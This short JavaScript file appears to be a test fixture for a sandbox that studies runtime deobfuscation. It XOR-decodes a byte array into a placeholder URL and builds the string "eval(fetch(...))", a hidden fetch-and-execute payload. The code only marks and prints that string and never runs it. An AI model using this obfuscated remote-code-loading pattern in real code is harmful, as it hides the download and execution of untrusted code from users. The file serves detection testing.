// Harmless demo: imitates runtime deobfuscation without doing anything dangerous.
// The sandbox has no Node.js APIs, no filesystem, and no network helpers.

function decode(parts) {
    let result = "";
    for (let i = 0; i < parts.length; i++) {
        result += String.fromCharCode(parts[i] ^ 0x23);
    }
    return result;
}

const encodedUrl = [
    75, 87, 87, 83, 80, 25, 12, 12, 70, 91, 66, 78, 83, 79, 70, 13, 74, 77, 85, 66, 79, 74, 71,
    12, 83, 66, 90, 79, 76, 66, 71, 13, 73, 80
];

const payload = "eval(fetch('" + decode(encodedUrl) + "'))";

mark("deobfuscated_payload", payload);
print("payload length:", payload.length);

